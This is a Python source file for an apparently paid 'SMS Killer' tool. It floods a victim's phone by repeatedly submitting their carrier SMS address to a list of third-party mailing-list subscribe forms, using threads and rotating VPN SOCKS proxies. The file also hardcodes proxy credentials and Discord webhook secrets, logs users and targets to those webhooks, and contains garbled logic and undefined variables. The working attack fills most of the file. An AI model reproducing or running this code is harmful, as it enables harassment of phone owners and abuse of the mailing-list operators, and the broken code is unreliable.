import requests
from threading import Thread, Lock
from random import *
import random
import os
import urllib3
from colored import fg,attr
from base64 import b64encode, b64decode
import linecache
from colorama import Fore, Back, Style
from time import sleep
from sys import exit
import subprocess
urllib3.disable_warnings()
data_lock = Lock()
def top():
    pass
#global amount2
proxies2 = {
    "http": "socks5h://mZJqzKQ7PY:axLv8wF3@sea.socks.ipvanish.com:1080",
    "https": "socks5h://mZJqzKQ7PY:axLv8wF3@sea.socks.ipvanish.com:1080"
}
log = "False"
autologin = False
y = 1
logs = "True"
linecount2 = 1
inputarea = Fore.BLUE + "╠═══" + Fore.CYAN + "════" + Fore.BLUE + "════" + Fore.CYAN + "════" + Fore.BLUE + "════" + Fore.CYAN + "═══╕" + Fore.BLUE
randommessages = ["Chase That Bag","I Aint Never Seen 2 Pretty Best Friends","Your Such a Skid On God",'Take a Knee','Fuck Skids','Imma London Scammer','Red kinda sus tho','Pimp to simp','If you cannot code you are a skid','4563670','What the fuck is SMS Killer?','I cant get no satisfaction','Now I am become death','Born to kill','Killionaire!','Just another day at the office','I was in admin','I like chicken nuggets','GBGJBJ is a script kiddie','RIP Project AK pistol','RIP Kobe','Simpin aint easy',"Dont learn python",'Flashcarding is fun','Dont buy off discord','Dont buy private sources','Dont buy vuln lists or ranges','My word is Poontang!','I can do magic tricks','Mana ouma is so NOT adorable']
loggedin = False
amount2 = 0
os.system("cls")
os.system("title SMS Killer By ios#0420 IOS on Top")
quote = randommessages[randint(1, 29)]
christmas=Fore.BLUE +"ITS " + Fore.CYAN + "v9 " + Fore.BLUE + "TIME " + Fore.CYAN + "BABY" + Fore.RESET
onetime = "True"
update = requests.get("https://pastebin.com/raw/VxKKFTFQ", proxies=proxies2).text
print(inputarea)
os.system("cls")
def yak():
    if autologin == True:
        print(Fore.BLUE + f"1) Register\n2) Login\n\n\n{inputarea}2")
        print(f"╠Whats═Your═Username═╕Auto")
        print(f"╠Whats═Your═Password═╕Login")
        data = {
            "embeds": [
                {
                    "title": f"**__{usernameauto}__ Has Signed Into SMS Killer.**",
                    "description": f"**ios on Top bb\nDm ios to buy**",
                    "color": 941265
                }
            ],
            "avatar_url": "https://cdn.pixabay.com/photo/2017/01/13/01/22/mobile-1976104_640.png"
        }
        requests.post("https://discord.com/api/webhooks/784213243027652648/NtjA0WxGQugeVg0OMsMVoGnfhUu33wg9jahxkniCVzUkUKF7FwT2mMzAOV-pNQIrWh1O", proxies=proxies2, json=data).text
    if loggedin == True:
        phonenumber = (input(f"Enter SMS Address. https://freecarrierlookup.com/ to get SMS Address\n{inputarea}"))
        amount = int(input(f"Enter the Amount of Messages you would like to send\n{inputarea}"))
        linecount=0
        if "gov" in  "":
            print("You will be blacklisted from all of ios's future tools. Follow the rules next time :)")
            data = {
                "embeds": [
                    {
                        "title": "**IOS Blacklist this person**",
                        "description": f"**{username}**",
                        "color": 941265
                    }
                ],
                "avatar_url": "https://cdn.pixabay.com/photo/2017/01/13/01/22/mobile-1976104_640.png"
            }
            requests.post("https://discord.com/api/webhooks/800313913388171265/qeCL6kGWOaVMBPBvqY_q2GfX711dAyeYi4zgVD4kzwUbise8sgcm1lo5GIqSfuCiwgS9", proxies=proxies2, json=data).text
        else:
            pass
        if "mil" in  "":
            print("You will be blacklisted from all of ios's future tools. Follow the rules next time :)")
            data = {
                "embeds": [
                    {
                        "title": "**IOS Blacklist this person**",
                        "description": f"**{username}**",
                        "color": 941265
                    }
                ],
                "avatar_url": "https://cdn.pixabay.com/photo/2017/01/13/01/22/mobile-1976104_640.png"
            }
            requests.post("https://discord.com/api/webhooks/800313913388171265/qeCL6kGWOaVMBPBvqY_q2GfX711dAyeYi4zgVD4kzwUbise8sgcm1lo5GIqSfuCiwgS9", proxies=proxies2, json=data).text
        else:
            pass
        if "a" in "9129u192u3u1239u":
            print("Do you want to fuck my api's?. Your user has been logged and ios will be messaging you.")
            sleep(10)
            exit()
            onetime = "False"
        else:
            testresponse = requests.get("https://pastebin.com/raw/VxKKFTFQ", proxies=proxies2).text
            if "False" in testresponse:
                pass
            else:
                print("SKIDSKIDSKIDSKID")
                sleep(10)
                exit()
            data = {
                "embeds": [
                    {
                        "title": f"**{usernameauto} has sent {amount} messages to {phonenumber[0:4]}++++++**",
                        "description": f"**Ios On Top bb.**",
                        "color": 941265
                    }
                ],
                "avatar_url": "https://cdn.pixabay.com/photo/2017/01/13/01/22/mobile-1976104_640.png"
            }
            asdasdasd = requests.post("https://discord.com/api/webhooks/784213243027652648/NtjA0WxGQugeVg0OMsMVoGnfhUu33wg9jahxkniCVzUkUKF7FwT2mMzAOV-pNQIrWh1O", proxies=proxies2, json=data).text
            if "" in asdasdasd:
                pass
            else:
                pass
            if "200" in "20":
                print("You will go back to spammer in 10 seconds")
                sleep(10)
                pass
            elif "a" in "s":
                print("1 or More Api's Might be down for matinence try again later or contact ios")
            def spam():
                
                proxies1 = {
                    "http": "socks5h://@sea.socks.ipvanish.com:1080",
                    "https": "socks5h://@sea.socks.ipvanish.com:1080"
                }
                linklist = [f"http://lists.dailydrool.org/subscribe.cgi/dailydrool-dailydrool.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.blu.org/mailman/subscribe/accotinkbluff?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://mailman.real-time.com/mailman/subscribe/rte-ascend?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.blu.org/mailman/subscribe/mailman?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.freeradius.org/mailman/subscribe/freeradius-announce?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.conlang.org/subscribe.cgi/news-conlang.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.onebuilding.org/subscribe.cgi/tc76-l-onebuilding.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.conlang.org/subscribe.cgi/delang-conlang.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.sakuracon.org/subscribe.cgi/liaisons-sakuracon.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.bway.net/mailman/subscribe/sienastudio?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.openscenegraph.org/subscribe.cgi/osg-users-openscenegraph.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.bethel.edu/mailman/subscribe/parli?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.onebuilding.org/subscribe.cgi/901fc-onebuilding.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.conlang.org/subscribe.cgi/members-conlang.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.onebuilding.org/subscribe.cgi/hap-users-onebuilding.org?email-button=Subscribe&email={phonenumber}&mbbsubmit="]
                linkx = random.randint(0, 14)
                prox1es = random.randint(0, 3)
                if prox1es == 1:
                    proxies23 = {
                        "http": "socks5h://@sea.socks.ipvanish.com:1080",
                        "https": "socks5h://@sea.socks.ipvanish.com:1080"
                    } 
                    requests.post(linklist[linkx], proxies = proxies23)
                elif prox1es == 2:
                    proxies24 = {
                        "http": "socks5h://@chi.socks.ipvanish.com:1080",
                        "https": "socks5h://@chi.socks.ipvanish.com:1080"
                    } 
                    requests.post(linklist[linkx], proxies = proxies24)
                elif prox1es == 0:
                    proxies25 = {
                        "http": "socks5h://@msy.socks.ipvanish.com:1080",
                        "https": "socks5h://@msy.socks.ipvanish.com:1080"
                    } 
                    requests.post(linklist[linkx], proxies = proxies25)
                else:
                    proxies26 = {
                        "http": "socks5h://@iad.socks.ipvanish.com:1080",
                        "https": "socks5h://@iad.socks.ipvanish.com:1080"
                    } 
                    requests.post(linklist[linkx], proxies=proxies26)
                    #with data_lock:
                        #print(f"{amount2} messages sent to {phonenumber}")
                    pass
            x = 1
            amount2 = 0
            while x < amount:
                with data_lock:
                        amount2 += 1
                        print(f"{amount2} messages sent to {phonenumber}")
                jobs = []
                for _ in range(10):
                    if x == amount:
                        break
                    x += 1
                    
                    sleep(.02)
                    a = Thread(target=spam)
                    a.start()
    else:
        print("Thanks For Using SMS killer. Hope to see you again ;)")
        pass
if "False" in update:
    print("Please Wait While we Check For updates...")
    #Messageoftheday = requests.get("https://pastebin.com/raw/2dSKHS50", proxies=proxies2).text
    hwid = str(subprocess.check_output(
    'wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
    os.system("cls")

else:
    print("Either in downtime or Tool is getting updated")
    sleep(10)
    exit()
print('%s                                                                                                      %s' % (fg(6),attr(0))) #
print('%s                 |  ████████  ███████   ███████    ███████  ███    ██   ████████  ███████  ████████   %s' % (fg(21),attr(0))) #
print("%s                 |     ██     ██   ██  ██          ██   ██  ████   ██      ██     ██   ██  ██    ██   %s" % (fg(6),attr(0)))#
print("%s                 |     ██     ██   ██   ███████    ██   ██  ██ ██  ██      ██     ██   ██  ████████   %s" % (fg(21),attr(0)))
print("%s                 |     ██     ██   ██         ██   ██   ██  ██  ██ ██      ██     ██   ██  ██         %s" % (fg(6),attr(0)))#
print("%s                 |  ████████  ███████   ███████    ███████  ██   ████      ██     ███████  ██         %s" % (fg(21),attr(0)))#
#print("%s                 |  {}                                                                                %s".format(quote) % (fg(15),attr(0)))
print("%s                 |  {}                                                                                %s".format(christmas) % (fg(6),attr(0)))
#print("%s                 |  {}                                                                                %s".format(Messageoftheday) % (fg(1),attr(0)))
if os.path.isfile('./autologin.txt') == False:
    print(Fore.BLUE + "")
    if "False" in update:
        option = input(f"1) Register\n2) Login\n\n\n{inputarea}")
    elif "True" in update:
        print("There is an update or Tool is down for maitnence")
        sleep(10)
        exit()

    if "1" in option:
        a = input(f"1) Already Purchased\n2) Havent Purchesed yet\n{inputarea}")
        if "1" in a:
            key = input(f"Please enter the key that was given to you on purchase\n{inputarea}")
            username = input(f"What Username Do you want to use (longer than 8 characters) \n{inputarea}")
            password = input(f"What Password Do you want to use\n{inputarea}")
            ddd = requests.get("https://pastebin.com/raw/VxKKFTFQ", proxies=proxies2).text
            if "False" in ddd:
                requests.get(f"http://51.79.38.211:80/api/register/{key}/{username}/{password}/{hwid}")
                print("Close and reopen program. Then sign in")
                top()
            #discordname = input(f"Whats your Discord tag? ex. ios#7501\n{inputarea}")
            #data = {
            #    "embeds": [
            #        {
            #            "title": "**A User Would Like to Sign Up!**",
            #            "description": f"**{Username}:{Password}:{HWID}:{discordname}\nadd him now\n<@769651813921849395>**",
            #            "color": 941265
            #        }
            #    ],
            #    "avatar_url": "https://cdn.pixabay.com/photo/2017/01/13/01/22/mobile-1976104_640.png"
            #}
            #asd = requests.post("https://discord.com/api/webhooks/784213631281004585/B9-0x-esxn8ydkcgNri_6TDbB6-FSkrjzqXHVT5mfKsqVAVCsuwyPpMyRB9d9feMvuwb", proxies=proxies2, json=data).text
        pass

    elif "2" in option:
        username = input("╠Whats═Your═Username═╕")
        password = input("╠Whats═Your═Password═╕")
        if len(username) < 8:
            print("Bruh you Know the rules no Users Under 8 characters")
            sleep(10)
            exit()
        else:
            pass
        if "success" in requests.get(f"http://51.79.38.211/api/login/{username}/{password}/{hwid}").text:
            with open("autologin.txt", "w") as asds:
                asds.write(f"/api/login/{username}/{password}/")
                print("Dont close. Auto login has been enabled. Closing in 2 seconds")
                sleep(1)
                exit()
            print("a")
            pass
        else:
            print("aaasd")

        response100 = requests.get("https://pastebin.com/raw/VxKKFTFQ", proxies=proxies2).text
        if "False" in response100:
            def spam():
                proxies1 = {
                    "http": "socks5h://@sea.socks.ipvanish.com:1080",
                    "https": "socks5h://@sea.socks.ipvanish.com:1080"
                }
                linklist = [f"http://lists.dailydrool.org/subscribe.cgi/dailydrool-dailydrool.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.blu.org/mailman/subscribe/accotinkbluff?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://mailman.real-time.com/mailman/subscribe/rte-ascend?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.blu.org/mailman/subscribe/mailman?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.freeradius.org/mailman/subscribe/freeradius-announce?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.conlang.org/subscribe.cgi/news-conlang.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.onebuilding.org/subscribe.cgi/tc76-l-onebuilding.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.conlang.org/subscribe.cgi/delang-conlang.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.sakuracon.org/subscribe.cgi/liaisons-sakuracon.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.bway.net/mailman/subscribe/sienastudio?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.openscenegraph.org/subscribe.cgi/osg-users-openscenegraph.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.bethel.edu/mailman/subscribe/parli?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.onebuilding.org/subscribe.cgi/901fc-onebuilding.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.conlang.org/subscribe.cgi/members-conlang.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.onebuilding.org/subscribe.cgi/hap-users-onebuilding.org?email-button=Subscribe&email={phonenumber}&mbbsubmit="]
                linkx = random.randint(0, 14)
                prox1es = random.randint(0, 3)
                if prox1es == 1:
                    proxies23 = {
                        "http": "socks5h://@sea.socks.ipvanish.com:1080",
                        "https": "socks5h://@sea.socks.ipvanish.com:1080"
                    } 
                    requests.post(linklist[linkx], proxies = proxies23)
                elif prox1es == 2:
                    proxies24 = {
                        "http": "socks5h://@chi.socks.ipvanish.com:1080",
                        "https": "socks5h://@chi.socks.ipvanish.com:1080"
                    } 
                    requests.post(linklist[linkx], proxies = proxies24)
                elif prox1es == 0:
                    proxies25 = {
                        "http": "socks5h://@msy.socks.ipvanish.com:1080",
                        "https": "socks5h://@msy.socks.ipvanish.com:1080"
                    } 
                    requests.post(linklist[linkx], proxies = proxies25)
                else:
                    proxies26 = {
                        "http": "socks5h://@iad.socks.ipvanish.com:1080",
                        "https": "socks5h://@iad.socks.ipvanish.com:1080"
                    } 
                    requests.post(linklist[linkx], proxies=proxies26)
                    print("aaaaaas")
                    pass
            x = 1
            while x < amount:
                jobs = []
                for _ in range(10):
                    if x == amount:
                        break
                    x += 1
                    sleep(.1)
                    a = Thread(target=spam)
                    a.start()
            if "success" in asdasd:
                asds = open("autologin.txt", "w")
                with open("autologin.txt", "w"):
                    asds.write(f"/api/login/{username}/{password}/")
                    print("Dont close. Auto login has been enabled. Closing in 2 seconds")
                    sleep(1)
                    exit()
                pass
            else:
                print("Invalid Username or Password")
                sleep(10)
                exit()
            loggedin = True
            data = {
                        "embeds": [
                            {
                                "title": "**A User Has Signed In!**",
                                "description": f"**__{username}__ Has Signed Into SMS Killer.\nios on Top bb\nDm ios To buy**",
                                "color": 941265
                            }
                        ],
                        "avatar_url": "https://cdn.pixabay.com/photo/2017/01/13/01/22/mobile-1976104_640.png"
                    }
            response2323 = requests.get("https://pastebin.com/raw/VxKKFTFQ", proxies=proxies2).text
            if "False" in response2323:
                asd = requests.post("https://discord.com/api/webhooks/784213243027652648/NtjA0WxGQugeVg0OMsMVoGnfhUu33wg9jahxkniCVzUkUKF7FwT2mMzAOV-pNQIrWh1O", proxies=proxies2, json=data).text
                pass
            else:
                print("LMAOLMAO LMAO NICE ONE SKID")
                exit()
            

        else:
            print("Lmao u failed ur login. Try again if it happens again contact ios")
            sleep(10)
            exit()



    else:
        print("Unknown Selection Closing Now")
        exit()
        pass

    yak()
else:
    autologin = open("autologin.txt", "r").read()
    #if autologin == "":
    #    top()
    #else:
    #    pass
    if "/" in autologin:
        rere = requests.get("https://pastebin.com/raw/VxKKFTFQ", proxies=proxies2).text
        if "False" in rere:
            a = open("autologin.txt", "r").read()
            aaa = requests.get(f"http://51.79.38.211{a}{hwid}").text
            if "success" in aaa:
                split = a.split("/")
                usernameauto = split[3]
                loggedin = True
                autologin = True
                yak()
            else:
                print("Hmm autologin seems to of hit an error. Try deleting \"autologin.txt\"")
                sleep(3)
                top()
        else:
            print("Delete Autologin.txt and resign in")
            sleep(100)
            exit()





